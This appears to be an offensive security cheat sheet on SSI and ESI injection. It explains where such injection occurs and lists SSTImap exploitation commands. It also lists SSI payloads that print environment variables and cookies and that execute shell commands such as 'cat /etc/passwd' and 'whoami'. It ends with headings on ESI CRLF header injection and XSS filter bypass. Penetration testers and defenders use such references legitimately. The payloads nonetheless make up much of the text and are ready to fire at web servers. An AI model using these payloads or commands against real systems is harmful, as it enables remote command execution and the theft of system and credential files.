entries.title: What is SSI and when injection occurs
entries.body:
Server Side Includes (SSI) are directives inside HTML pages that are evaluated by the server at the moment the page is served. They allow adding dynamic content without a full-fledged CGI.

SSI Injection occurs when an attacker can push SSI directives into the application's input data. The directives can include files, execute commands, and print environment variables. If user input is not sanitized in the SSI context, it can be used to influence the server's behavior: read sensitive data or execute commands.

SSI format: <!--#directive param="value" -->

entries.title: Where to look for SSI / ESI
entries.body:
• .shtml, .stm, .shtm pages - a classic sign of SSI enabled on Apache/nginx.
• Any user input that is later rendered back into an HTML page.
• ESI - at the level of edge caches and reverse proxies (Squid, Varnish, Fastly, Akamai). The surrogate does not distinguish real ESI tags from injected ones: if you manage to push an ESI tag into the HTTP response, the surrogate will process it as legitimate.
• ESI often requires the header Surrogate-Control: content="ESI/1.0" in the upstream response.
• First try the markers <!--#echo ... --> and <esi:include ...>; if it rendered, escalate to file reading and RCE.

entries.title: Tool - SSTImap (SSI detection and exploitation)
entries.body:
python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s
python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SSI
python3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'

entries.title: #echo - print environment variables (detection)
entries.body:
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#echo var="http_user_agent" -->
<!--#echo var="http_cookie" -->
<!--#echo var="remote_addr" -->
<!--#echo var="server_software" -->
<!--#echo var="query_string" -->

entries.title: #exec - command execution (Linux)
entries.body:
<!--#exec cmd="ls" -->
<!--#exec cmd="/bin/ls /" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="whoami"-->
<!--#exec cmd="uname" -->

entries.title: What is ESI Injection
entries.body:
An HTTP surrogate (caching reverse proxy) does not distinguish real ESI tags from the upstream and malicious ones injected into the HTTP response. If an attacker pushes ESI tags into the response, the surrogate will process and evaluate them without question, treating them as legitimate upstream tags.

Some surrogates need to be signaled to process ESI with the Surrogate-Control header:

Surrogate-Control: content="ESI/1.0"

entries.title: ESI - CRLF header injection via src
ESI - XSS via esi:assign / esi:vars (filter bypass)
